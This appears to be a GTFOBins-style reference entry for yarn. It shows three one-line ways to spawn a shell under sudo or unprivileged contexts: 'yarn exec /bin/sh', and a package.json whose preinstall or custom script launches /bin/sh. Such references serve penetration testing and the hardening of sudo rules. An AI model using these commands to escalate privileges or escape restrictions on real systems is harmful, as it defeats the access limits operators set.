title: yarn
html:
yarn

Shell

Context: sudo, unprivileged

yarn exec /bin/sh

Context: sudo, unprivileged

echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
yarn --cwd .

Context: sudo, unprivileged

echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
yarn --cwd . xxx
excerpt: yarn Shell Context: sudo, unprivileged yarn exec /bin/sh Context: sudo, unprivileged echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json yarn --cwd .
